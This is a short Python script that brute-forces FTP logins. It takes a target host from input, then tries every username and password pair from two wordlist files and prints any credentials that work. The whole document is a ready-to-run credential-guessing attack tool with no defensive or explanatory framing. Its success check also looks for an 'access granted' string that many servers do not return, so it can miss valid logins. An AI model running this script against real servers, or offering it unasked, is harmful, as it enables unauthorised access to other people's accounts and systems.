#!/usr/bin/env python3

import ftplib

def brute_force(ip_address,user,password):
    ftp = ftplib.FTP(ip_address)
    try:
        print("Testing user {}, password {}".format(user, password))
        response = ftp.login(user,password)
        if "230" in response and "access granted" in response:
            print("[*]Successful brute force")
            print("User: "+ user + " Password: "+password)
        else:
            pass
    except Exception as exception:
        print('Connection error', exception)

def main():
    ip_address = input("Enter IP address or host name:")
    users = open('users.txt','r')
    users = users.readlines()
    passwords = open('passwords.txt','r')
    passwords = passwords.readlines()

    for user in users:
        for password in passwords:
            brute_force(ip_address,user.rstrip(),password.rstrip())

if __name__ == '__main__':
    main()

